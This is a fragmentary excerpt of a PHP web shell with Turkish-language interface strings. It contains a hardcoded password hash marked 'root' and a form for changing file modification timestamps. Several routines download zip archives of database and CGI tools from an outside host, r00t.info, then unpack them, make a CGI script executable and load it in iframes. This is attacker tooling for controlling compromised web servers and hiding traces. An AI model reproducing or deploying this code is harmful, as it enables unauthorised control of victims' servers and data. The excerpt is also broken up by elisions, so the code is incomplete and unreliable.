<?php  $auth_pass = "63a9f0ea7bb98050796b649e85481845"; //root
 $color = "ff7f00";
...
"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
 ...
 if(!file_exists('yazilimlar/sqlbudd/index.php')){ $dizin = 'http://r00t.info/shell-dosyalar/sqlbudd.zip';
 ...
 if(file_exists('sqlbudd.zip')){ @unlink('sqlbudd.zip');
 } if($cikar){ echo "<iframe src=yazilimlar/sqlbudd/index.php width=100% height=100% frameborder=0></iframe> ";
 } else{ echo '<div class="alert alert-danger"><strong>Hata!</strong> Dosya indirilirken kritik bir hata oluştu.</div>';
 } } elseif(file_exists('yazilimlar/sqlbudd/index.php')){ echo "<iframe src=yazilimlar/sqlbudd/index.php width=100% height=100% frameborder=0></iframe> ";
 } printFooter();
...
" allowtransparency="true"></iframe></center>
 ...
 if(!file_exists('yazilimlar/cgi/rot.cin')){ $dizin = 'http://r00t.info/shell-dosyalar/cgi.zip';
 function dosya_indir($link,$name=null) { $link_info = pathinfo($link);
 $uzanti = strtolower($link_info['extension']);
 $file = ($name) ? $name.'.'.$uzanti : $link_info['basename'];
 $curl = curl_init($link);
 ...
 } if($cikar){ chmod('yazilimlar/cgi/rot.cin', 0755);
 echo "<iframe src=yazilimlar/cgi/rot.cin width=100% height=100% frameborder=0></iframe> ";
 } else{ echo '<div class="alert alert-danger"><strong>Hata!</strong> Dosya indirilirken kritik bir hata oluştu.</div>';
 } } elseif(file_exists('yazilimlar/cgi/rot.cin')){ echo "<iframe src=yazilimlar/cgi/rot.cin width=100% height=100% frameborder=0></iframe> ";
 } printFooter();
...
';
 ...
 if(!file_exists('yazilimlar/sqlbuddy/index.php')){ $dizin = 'http://r00t.info/shell-dosyalar/sqlbuddy.zip';
 function dosya_indir($link,$name=null) { $link_info = pathinfo($link);
 $uzanti = strtolower($link_info['extension']);
 $file = ($name) ? $name.'.'.$uzanti : $link_info['basename'];
 $curl = curl_init($link);
